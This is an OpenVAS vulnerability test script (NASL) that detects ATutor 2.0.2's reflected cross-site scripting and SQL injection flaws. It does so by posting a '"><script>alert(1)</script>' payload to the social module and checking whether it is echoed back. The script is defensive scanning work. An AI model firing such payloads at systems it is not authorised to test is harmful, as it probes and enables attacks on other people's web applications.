###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_atutor_mult_vuln.nasl 7044 2017-09-01 11:50:59Z teissa $
#
# Atutor Multiple Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902728");
  script_version("$Revision: 7044 $");
  script_tag(name:"last_modification", value:"$Date: 2017-09-01 13:50:59 +0200 (Fri, 01 Sep 2017) $");
  script_tag(name:"creation_date", value:"2011-09-22 10:24:03 +0200 (Thu, 22 Sep 2011)");
  script_bugtraq_id(49057);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Atutor Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17631/");
  script_xref(name : "URL" , value : "http://securityreason.com/wlb_show/WLB-2011080041");
  script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5037.php");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103765/ZSL-2011-5037.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation will let attackers to execute arbitrary
  script code or to compromise the application, access or modify data, or exploit
  latent vulnerabilities in the underlying database.

  Impact Level: Application");
  script_tag(name : "affected" , value : "ATutor version 2.0.2");
  script_tag(name : "insight" , value : "Multiple flaws are due to an,
  - Input passed to the 'lang' parameter in '/documentation/index_list.php' is
  not properly sanitised before being returned to the user.
  - Input passed to the 'p_course', 'name' and 'value' parameters in
  '/mods/_standard/social/set_prefs.php' scripts is not properly sanitised
  before being used in SQL queries.
  - Input passed via the 'search_friends_HASH' POST parameter, where HASH is
  the value generated by the 'rand_key' parameter, to the
  '/mods/_standard/social/index_public.php' script is not properly sanitised
  before being returned to the user.");
  script_tag(name : "solution" , value : "Upgrade to ATutor version 2.0.3 or later.
  For updates refer to http://www.atutor.ca/atutor/");
  script_tag(name : "summary" , value : "This host is running Atutor and is prone to information
  disclosure, SQL injection, and cross site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:port)) {
  exit(0);
}

## Get the host name
host = http_host_name(port:port);

## Check for each possible path
foreach dir (make_list_unique("/ATutor", "/atutor", "/", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  ## Send and Receive the response
  res = http_get_cache(item: dir + "/login.php", port:port);

  ## Confirm the application
  if("ATutor<" >< res)
  {
    rand = rand();
    xss = 'search_friends_' + rand + '=1>"><script>alert(1)</script>&search=' +
          'Search&rand_key=' + rand;
    filename = string(dir + "/mods/_standard/social/index_public.php");

    ## Construct post request
    sndReq2 = string( "POST ", filename, " HTTP/1.1\r\n",
                      "Host: ", host, "\r\n",
                      "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                      "Content-Type: application/x-www-form-urlencoded\r\n",
                      "Content-Length: ", strlen(xss), "\r\n\r\n",
                       xss);

    ## Check the response to confirm vulnerability
    rcvRes2 = http_keepalive_send_recv(port:port, data:sndReq2);
    if(rcvRes2 =~ "HTTP/1\.. 200" && '"><script>alert(1)</script>' >< rcvRes2)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
